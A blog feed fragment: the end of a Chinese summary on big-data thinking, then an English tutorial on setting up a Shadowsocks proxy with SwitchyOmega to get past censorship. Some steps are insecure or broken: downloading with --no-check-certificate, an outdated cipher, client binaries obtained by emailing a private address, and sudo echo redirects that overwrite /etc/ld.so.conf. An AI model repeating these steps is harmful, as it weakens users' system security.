举个例子：关于幸福感的研究，学术界的大多人士都表明，幸福感是一种感觉，并不与财富的多少以及生活水平的高低成正比。社会心理学家曾列过这样的一个公式：期望实现值除以内心的期望值才等于人的情绪指数。期望实现值与内心期望值的比值一旦大于或等于1时，人就会处于一种兴奋的状态，就会感到满足；相反，如果期望实现值与内心期望值的比值小于1时，人就会感到压抑，“唉”声连连，甚至做出一些平时不做的极端事。 7.2 谈判思维 所谓谈判，说的就是彼此之间，为了实现某种目的而进行的一种意见交换，然后寻找到一个制衡点，寻求问题解决的途径并达成协议的过程。 在商业谈判中，我们绝对不能忽略数据对谈判结果产生的影响。 打个比方说，数据就好比是一棵大树的枝叶，而想要与另一棵大树做比较的时候，除了其主干因素外，这些枝叶就是最为明显的可比部分。也就是说，掌控足够多的数据，将在谈判过程中掌控先机。 如何利用数据在谈判中获得优势呢？ 掌控绝对的数据 还要有针对性 不利用数据，仅仅依靠过去经验和谈判员的弊端 对产品认识不足的情况很容易出现在谈判桌上，从而导致在谈判中失去主导地位。而且，由于这种产品知识比较抽象，将之比喻为对产品以及产品所在行业的市场直觉更为合适。而直觉又往往是很难通过言语表达出来的，这就使得我们很难组织出一套权威的术语来说服对方，所以，就很难赢得对方的认可。 更为重要的一点是，要想形成产品知识，还和销售人员有着至关重要的关系。 7.3 预算思维 在这个时代，财务所面对的数据规模将会越来越大，数据类型也将越来越复杂。那么，如何整理与统计这些杂乱无章的数据，让这些数据能够更直观明了地展现在人们面前，并且为企业管理者的经营决策提供有效的科学依据，则成为现阶段我们必然考虑的问题之一。 对此问题，业内人士表示，全面预算管理将是让企业大数据“活起来”的最好方式。首先，预算是根据历年的数据和某些调整信息，对未来时期进行分析评测，进而得出的信息。其次，它是由实际业务数据和预算数据相结合与比较之后，而设计出来的一套最佳管理方案。利用这套方案，可以让企业资源得到更充分的利用，从而在未来获得更大的利益回报。 笼统地说，全面预算管理解决方案是在对企业内外部大数据进行收集、处理、控制、分析、整合等的基础上，与其他工具结合，帮助企业更好地利用数据实现战略落地。 7.4 选定思维 你了解你的客户吗？你能分清你的客户群体中哪些是可以长久合作、哪些只是暂时短期的利益相互关系吗？你的营销和广告投入应该针对哪类客户群体，你都清楚吗？ 企业想要做到正确的定位客户，首先就必须先设定目标。 找到有价值的客户并不代表着就一定能够进行合作。 “建立品牌” 8 教育、教学正在大数据化 8.1 院校思维 “大数据”时代，如何推动和创新院校教育模式 区别：传统数据的整理方式能凸显学生整体的专业水平或整体素质、身体的发育状况、社会性情绪及适应性的发展，还有对学校的满意程度等。而大数据就不一样了，它具备的分析能力更广、更细腻。它可以去关注每一个学生的微观表现，比如，在考试时，他在一道题上逗留了多久；在不同学科课堂上，他开小差的次数是多少；在食堂吃饭，他喜欢吃什么，不喜欢吃什么；每个学生的出生日期，包括喜欢的颜色等。 这些数据对其他个体没有意义，但所有学生的数据整合起来对大数据分析就有价值了。比如旷课、纪律或课堂表现等预测模式，教育者就可以确认哪些学生退学的可能性较高。通过利用大数据来观察并分析对学生在课堂中点滴的表现，大数据帮助我们可以了解学生对知识的掌握程度以及感兴趣程度，进而让学校反思自己的教学模式是不是满足了学生的需求。有了大数据以后，教育工作者们就可以针对不同的学生进行不同的教育模式，从而真正做到因材施教和以人为本。 传统的院校决策模式总结为四种： 第一种是通过“合意”的过程来平衡大学内多方群体利益的“学院型”模式； 第二种是通过“扩散”程序表达不同权力集团、利益群体诉求的“政治型”模式； 第三种是决策程序无章可循、随意性大的“有组织无政府型”模式； 第四种是依靠决策者所具有的理性认知能力制定决策的“官僚主义”模式。 这四种模式的共同弱点在于缺少有力的决策支持依据，管理者实际上是以“有限理性”为基础，努力做出“足够好”的决策。 在大数据背景下的院校决策，可以为教育决策者提供和完善认知经验所缺乏的信息、知识和智慧。针对这样的情况，有学者将其称为以数据系统为支撑的“知会理性”决策模式。 8.2 教学思维 大数据变革教育的第一波浪潮 翻转课堂是未来教育的课堂模式。采取让学生在上课前先学习教学视频，在课堂上完成作业或做实验的方式，而老师则在学生遇到学习困难时给予帮助，对他们进行一对一的个性化指导。 MOOC风暴来袭，放大翻转课堂效应。 微课程兴起：回应翻转课堂和MOOC浪潮。 8.3 教育思维 “大数据时代”以不可挡的势头扑面而来，给教育界的人敲响了警钟，告诉他们：“原始”的教育方式已经成为过去，“新时代”已经袭来。 “大数据”并不是一种技术的时尚潮流，而是在信息技术高度发展之后，人们如何开发利用数据为新的商业模式发展奠定基础的过程。与此同时，也是一种基于新工具解决问题的全新思路。 “大数据”怎么样改变传统的教育？ 第一个方面是改变教育研究中对数据价值的认识； 第二个方面是方便校长、教师更全面了解每一个学生； 第三个方面是帮助学生进行个性化高效学习。</summary></entry><entry><title type="html">Over the wall with Shadowsocks+SwitchyOmega</title><link href="http://localhost:4000/network/software/2018/08/10/shadowsocks-switchyOmega-en/" rel="alternate" type="text/html" title="Over the wall with Shadowsocks+SwitchyOmega" /><published>2018-08-10T00:00:00+08:00</published><updated>2018-08-10T00:00:00+08:00</updated><id>http://localhost:4000/network/software/2018/08/10/shadowsocks-switchyOmega-en</id><content type="html" xml:base="http://localhost:4000/network/software/2018/08/10/shadowsocks-switchyOmega-en/">&lt;p&gt;
If you have any questions abount this article, or if you have found any errors in this article, email me, please. This is my email address: zrg1390556486@gmail.com
&lt;/p&gt;

&lt;div class=&quot;org-center&quot;&gt;
&lt;p&gt;
This article is for communication only, please do not use for business! The author of this article is not responsible for any consequences. thanks for your attention!
&lt;/p&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-org6f862b2&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org6f862b2&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; Server&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org52145b1&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org52145b1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; Buy a Cloud Host&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://www.digitalocean.com&quot;&gt;DigitalOcean&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;AWS&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vultr.com/&quot;&gt;Vultr&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgc85b536&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgc85b536&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; Solution 1: Using Original Shadowsocks&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
Installing pip
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# yum install python-pip
or
# curl &quot;https://bootstrap.pypa.io/get-pip.py&quot; -o &quot;get-pip.py&quot;
# python get-pip.py

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// update
# pip install --upgrade pip

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
Installing shadowsocks
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# pip install shadowsocks
# vim /etc/shadowsocks.json

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;{
  &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;server&quot;&lt;/span&gt;: &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;server_ip&quot;&lt;/span&gt;,//server ip address
  &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;server_port&quot;&lt;/span&gt;: 8388,//server port
  &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;local_address&quot;&lt;/span&gt;:&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;,//local address
  &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;local_port&quot;&lt;/span&gt;:1080,//local port
  &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;port_password&quot;&lt;/span&gt;:{ //multiple port
          &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;9001&quot;&lt;/span&gt;:&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;password9001&quot;&lt;/span&gt;,
          &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;9002&quot;&lt;/span&gt;:&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;password9002&quot;&lt;/span&gt;,
          &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;9003&quot;&lt;/span&gt;:&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;password9003&quot;&lt;/span&gt;,
     },
  &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;password&quot;&lt;/span&gt;: &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;password&quot;&lt;/span&gt;,//password
  &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;method&quot;&lt;/span&gt;: &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;aes-256-cfb&quot;&lt;/span&gt;,//encryption
  &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;timeout&quot;&lt;/span&gt;:600 //timeout
  }
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;
explanation:
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-txt&quot;&gt;- &quot;server&quot;: &quot;123.123.123.123&quot; :: server ip address
- &quot;server_port&quot;: 8388 :: server port
- &quot;local_address&quot;:&quot;127.0.0.1&quot; :: local ip address
- &quot;local_port&quot;:1080, :: local port
- &quot;port_password&quot; :: port and password
- &quot;password&quot;: &quot;password&quot; :: password                                                                                                         
- &quot;method&quot;: &quot;aes-256-cfb&quot; :: encrypt method, more detail:[[http://ucdok.com/project/generate_password.html][password tool]]
- &quot;timeout&quot;:600 :: over time
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
Configuring auto-start script
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
#vim /etc/systemd/system/shadowsocks.service

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;[Unit]
Description=Shadowsocks

[Service]
TimeoutStartSec=0
ExecStart=/usr/bin/ssserver -c /etc/shadowsocks.json

[Install]
WantedBy=multi-user.target
&lt;/pre&gt;
&lt;/div&gt;
&lt;pre class=&quot;example&quot;&gt;
Start shadowsocks
#systemctl enable shadowsocks
#systemctl start shadowsocks
#systemctl status shadowsocks -l

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
Auto install script
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ vim install-shadowsocks.sh, content of file from 

&lt;/pre&gt;
&lt;p&gt;
&lt;a href=&quot;https://github.com/zhaorengui/article/blob/master/network/install-shadowsocks.sh&quot;&gt;install-shadowsocks.sh&lt;/a&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# chmod +x install-shadowsocks.sh
# ./install-shadowsocks.sh

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgd78f429&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgd78f429&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.3&lt;/span&gt; Solution 2: Using docker&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
Installing docker
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# yum install docker
# systemctl enable docker
# systemctl start docker

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
Deploy shadowsocks
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# docker run -dt --name ss -p 6443:6443 mritd/shadowsocks -s &quot;-s 0.0.0.0 -p 6443 -m aes-256-cfb -k test123 --fast-open&quot;

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org344a4e5&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org344a4e5&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; Client&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orga58e703&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orga58e703&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.1&lt;/span&gt; Linux&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1d1b5f9&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org1d1b5f9&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.1.1&lt;/span&gt; Command Line Client on Linux&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-1-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
Linux series
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
Debian/Ubuntu:
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo apt-get install python-pip
$ sudo pip install shadowsocks

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
Fedora/Centos:
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo yum install python-setuptools   or   sudo dnf install python-setuptools
$ sudo easy_install pip
$ sudo pip install shadowsocks

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
OpenSUSE:
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo zypper install python-pip
$ sudo pip install shadowsocks

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
Archlinux:
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo pacman -S python-pip
$ sudo pip install shadowsocks

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;
sslocal is the client software and ssserver is the server software. On some Linux distros such as ubuntu, the shadowsocks client sslocal is installed under &lt;i&gt;usr/local/bin. On Others such as Arch sslocal is installed under /usr/bin&lt;/i&gt;. Your can use whereis command to find the exact location.
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ whereis sslocal

&lt;/pre&gt;
&lt;p&gt;
sslocal: /usr/local/bin/sslocal
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
/etc/shadowsocks.json
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;{
&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;server&quot;&lt;/span&gt;:&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;server-ip&quot;&lt;/span&gt;,
&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;server_port&quot;&lt;/span&gt;&lt;span style=&quot;color: #F92672;&quot;&gt;:8000&lt;/span&gt;,
&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;local_address&quot;&lt;/span&gt;: &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;,
&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;local_port&quot;&lt;/span&gt;&lt;span style=&quot;color: #F92672;&quot;&gt;:1080&lt;/span&gt;,
&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;password&quot;&lt;/span&gt;:&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;your-password&quot;&lt;/span&gt;,
&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;timeout&quot;&lt;/span&gt;&lt;span style=&quot;color: #F92672;&quot;&gt;:600&lt;/span&gt;,
&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;method&quot;&lt;/span&gt;:&lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;aes-256-cfb&quot;&lt;/span&gt;
}
&lt;/pre&gt;
&lt;/div&gt;
&lt;pre class=&quot;example&quot;&gt;
// start
$ sudo sslocal -c /etc/shadowsocks.json

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// To run in the background
$ sudo sslocal -c /etc/shadowsocks.json -d start

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
/etc/rc.local
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo vim /etc/rc.local

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;sudo sslocal -c /etc/shadowsocks.json -d start
&lt;/pre&gt;
&lt;/div&gt;

&lt;pre class=&quot;example&quot;&gt;
// Check if It Works
# sudo systemctl status rc-local.service

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org763386c&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org763386c&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.1.2&lt;/span&gt; Global Proxy&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-1-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
Install and Configure polipo
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo apt install polipo
$ sudo vim /etc/polipo/config

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgedc18cc&quot;&gt;&lt;span style=&quot;color: #FD971F;&quot;&gt;logSyslog&lt;/span&gt; = true
&lt;span style=&quot;color: #FD971F;&quot;&gt;logFile&lt;/span&gt; = /var/log/polipo/polipo.log
&lt;span style=&quot;color: #FD971F;&quot;&gt;proxyAddress&lt;/span&gt; = &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;0.0.0.0&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FD971F;&quot;&gt;socksParentProxy&lt;/span&gt; = &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;127.0.0.1:1080&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FD971F;&quot;&gt;socksProxyType&lt;/span&gt; = socks5
&lt;span style=&quot;color: #FD971F;&quot;&gt;chunkHighMark&lt;/span&gt; = 50331648
&lt;span style=&quot;color: #FD971F;&quot;&gt;objectHighMark&lt;/span&gt; = 16384
&lt;span style=&quot;color: #FD971F;&quot;&gt;serverMaxSlots&lt;/span&gt; = 64
&lt;span style=&quot;color: #FD971F;&quot;&gt;serverSlots&lt;/span&gt; = 16
&lt;span style=&quot;color: #FD971F;&quot;&gt;serverSlots1&lt;/span&gt; = 32
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
Restart polipo
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo systemctl restart polipo

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
Export http_proxy and https_proxy
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ export http_proxy=&quot;http://127.0.0.1:8123/&quot;
$ export https_proxy=&quot;https://127.0.0.1:8123/&quot;

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
testing
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ curl www.google.com

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org890b1ee&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org890b1ee&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.1.3&lt;/span&gt; Solving Problem&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-1-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
ShadowSocks start error: undefined symbol EVP_CIPHER_CTX_cleanup
[Reason]
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
openssl 1.1.0 &quot;EVP_CIPHER_CTX_cleanup&quot; is old.

&lt;/pre&gt;
&lt;p&gt;
[Solving]
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ vim /usr/local/lib/python3.5/dist-packages/shadowsocks/crypto/openssl.py

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-python&quot; id=&quot;orgf626dc8&quot;&gt;VIM Command&amp;#65306;
:%s/cleanup/reset/
:x
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
not support &quot;chacha20&quot;
[Solving]
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ apt install m2crypto gcc -y
$ wget -N --no-check-certificate https://download.libsodium.org/libsodium/releases/libsodium-1.0.8.tar.gz
$ tar zxvf libsodium-1.0.8.tar.gz
$ cd libsodium-1.0.8
$ sudo ./configure
$ sudo make &amp;amp;&amp;amp; make install
$ sudo echo &quot;include ld.so.conf.d/*.conf&quot; &amp;gt; /etc/ld.so.conf
$ sudo echo &quot;/lib&quot; &amp;gt;&amp;gt; /etc/ld.so.conf
$ sudo echo &quot;/usr/lib64&quot; &amp;gt;&amp;gt; /etc/ld.so.conf
$ sudo echo &quot;/usr/local/lib&quot; &amp;gt;&amp;gt; /etc/ld.so.conf
$ sudo ldconfig

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf2cffc7&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgf2cffc7&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.2&lt;/span&gt; Windows&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgc02936e&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgc02936e&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.2.1&lt;/span&gt; Download&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-2-1&quot;&gt;
&lt;p&gt;
Get shadowsocks client by sending email to zrg1390556487@gmail.com
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgc0995d3&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgc0995d3&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.2.2&lt;/span&gt; Configure&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-2-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;unzip
&lt;img src=&quot;http://localhost:4000/assets/images/shadowsocks-20170123111438.png&quot; alt=&quot;shadowsocks-20170123111438.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;running
&lt;img src=&quot;http://localhost:4000/assets/images/shadowsocks-20170123111902.png&quot; alt=&quot;shadowsocks-20170123111902.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;configuring
&lt;img src=&quot;http://localhost:4000/assets/images/shadowsocks-20170123111953.png&quot; alt=&quot;shadowsocks-20170123111953.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;proxy
&lt;img src=&quot;http://localhost:4000/assets/images/shadowsocks-20170123112126.png&quot; alt=&quot;shadowsocks-20170123112126.png&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdc970c9&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgdc970c9&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.3&lt;/span&gt; Android&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-3&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9ac5804&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org9ac5804&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.3.1&lt;/span&gt; Download&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-3-1&quot;&gt;
&lt;p&gt;
Get shadowsocks client by sending email to zrg1390556487@gmail.com
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orga224e18&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orga224e18&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.3.2&lt;/span&gt; Configure&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-3-2&quot;&gt;

&lt;div class=&quot;figure&quot;&gt;
&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/shadowsocks-20170123141118.png&quot; alt=&quot;shadowsocks-20170123141118.png&quot; /&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org730b919&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org730b919&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.4&lt;/span&gt; IOS&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-4&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;Open &quot;App Store&quot;, To search &quot;shadowrocket&quot;. Current price: ￥12&lt;/li&gt;
&lt;li&gt;Add server configure. Okay.
&lt;img src=&quot;http://localhost:4000/assets/images/ios-shadowrocket-01.jpeg&quot; alt=&quot;ios-shadowrocket-01.jpeg&quot; /&gt;
&lt;img src=&quot;http://localhost:4000/assets/images/ios-shadowrocket-02.jpeg&quot; alt=&quot;ios-shadowrocket-02.jpeg&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org99ee1a9&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org99ee1a9&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.5&lt;/span&gt; Mac OS X&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-5&quot;&gt;
&lt;p&gt;
&lt;a href=&quot;https://github.com/shadowsocks/ShadowsocksX-NG&quot;&gt;https://github.com/shadowsocks/ShadowsocksX-NG&lt;/a&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org572ac76&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org572ac76&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; Browser Plugin: SwitchyOmega&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgb82a9e9&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgb82a9e9&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.1&lt;/span&gt; Download&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-1&quot;&gt;
&lt;p&gt;
Get shadowsocks client by sending email to zrg1390556487@gmail.com
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org437e49e&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org437e49e&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.2&lt;/span&gt; Configure&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;set proxy
&lt;img src=&quot;http://localhost:4000/assets/images/switchyomega-01.png&quot; alt=&quot;switchyomega-01.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
set rule
&lt;img src=&quot;http://localhost:4000/assets/images/switchyomega-02.png&quot; alt=&quot;switchyomega-02.png&quot; /&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
rule:http://autoproxy-gfwlist.googlecode.com/svn/trunk/gfwlist.txt
or
https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org48ccbea&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org48ccbea&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;4&lt;/span&gt; References&lt;/h2&gt;
